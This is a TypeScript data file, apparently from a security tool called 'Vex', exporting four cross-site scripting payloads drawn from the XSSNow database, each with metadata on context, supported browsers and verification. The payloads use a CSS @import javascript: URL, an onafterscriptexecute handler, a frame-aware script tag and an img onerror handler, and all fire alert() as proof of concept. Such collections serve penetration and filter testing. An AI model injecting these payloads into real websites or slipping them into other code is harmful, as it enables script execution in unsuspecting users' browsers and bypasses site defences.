// ============================================================
// Vex — Cross the line.
// Unique Payloads
// Auto-generated from XSSNow payload database
// ============================================================

import type { Payload } from '@/types';

export const uniquePayloads: Payload[] = [
  {
    id: `unique-css-import-with-javascript-protocol-55`,
    payload: `<style>@import'javascript:alert("XSS")';</style>`,
    description: `CSS import with javascript protocol`,
    category: `unique`,
    context: `css`,
    difficulty: `intermediate`,
    tags: [
      `css`,
      `import`,
      `javascript`,
    ],
    wafBypass: [],
    encoding: [
      `none`,
    ],
    characterCount: 48,
    worksWhen: [
      `no-filter`,
    ],
    browsers: [
      `Chrome`,
      `Firefox`,
    ],
    author: `Sid Joshi`,
    contributor: `Sid Joshi`,
    githubUsername: `dr34mhacks`,
    country: `India`,
    dateAdded: `2025-12-31`,
    verified: true,
  },
  {
    id: `unique-custom-element-with-script-execution-event-56`,
    payload: `<xss onafterscriptexecute=alert(1)><script>1</script>`,
    description: `Custom element with script execution event`,
    category: `unique`,
    context: `html`,
    difficulty: `intermediate`,
    tags: [
      `custom`,
      `onafterscriptexecute`,
      `unique`,
    ],
    wafBypass: [],
    encoding: [
      `none`,
    ],
    characterCount: 53,
    worksWhen: [
      `no-filter`,
    ],
    browsers: [
      `Firefox`,
    ],
    author: `Sid Joshi`,
    contributor: `Sid Joshi`,
    githubUsername: `dr34mhacks`,
    country: `India`,
    dateAdded: `2025-12-31`,
    verified: true,
  },
  {
    id: `unique-frame-aware-xss-payload-57`,
    payload: `<script>top.alert?top.alert(1):alert(1)</script>`,
    description: `Frame-aware XSS payload`,
    category: `unique`,
    context: `html`,
    difficulty: `intermediate`,
    tags: [
      `frame`,
      `conditional`,
      `unique`,
    ],
    wafBypass: [],
    encoding: [
      `none`,
    ],
    characterCount: 48,
    worksWhen: [
      `no-filter`,
    ],
    browsers: [
      `Chrome`,
      `Firefox`,
      `Safari`,
      `Edge`,
    ],
    author: `Sid Joshi`,
    contributor: `Sid Joshi`,
    githubUsername: `dr34mhacks`,
    country: `India`,
    dateAdded: `2025-12-31`,
    verified: true,
  },
  {
    id: `unique-regex-source-property-xss-58`,
    payload: `<img src=1 onerror=alert(/XSS/.source)>`,
    description: `Regex source property XSS`,
    category: `unique`,
    context: `html`,
    difficulty: `intermediate`,
    tags: [
      `regex`,
      `source`,
      `unique`,
    ],
    wafBypass: [],
    encoding: [
      `none`,
    ],
    characterCount: 39,
    worksWhen: [
      `no-filter`,
    ],
    browsers: [
      `Chrome`,
      `Firefox`,
      `Safari`,
      `Edge`,
    ],
    author: `Sid Joshi`,
    contributor: `Sid Joshi`,
    githubUsername: `dr34mhacks`,
    country: `India`,
    dateAdded: `2025-12-31`,
    verified: true,
  }
];
